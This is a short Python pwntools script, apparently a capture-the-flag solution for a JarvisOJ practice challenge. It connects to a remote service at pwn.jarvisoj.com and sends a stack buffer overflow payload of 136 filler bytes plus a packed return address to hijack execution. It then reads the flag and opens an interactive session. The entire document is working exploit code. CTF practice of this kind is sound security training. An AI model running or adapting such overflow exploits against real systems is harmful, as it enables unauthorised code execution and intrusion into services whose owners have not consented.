from pwn import *
p = remote('pwn.jarvisoj.com', 9876)

payload = 'a' * 136 + p64(0x0000000000400620)
p.send(payload)
flag = p.recv(100)
print flag
p.interactive()
